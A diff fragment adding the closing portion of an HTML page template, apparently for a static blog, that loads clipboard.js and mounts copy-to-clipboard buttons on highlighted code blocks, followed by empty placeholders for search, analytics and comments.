+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
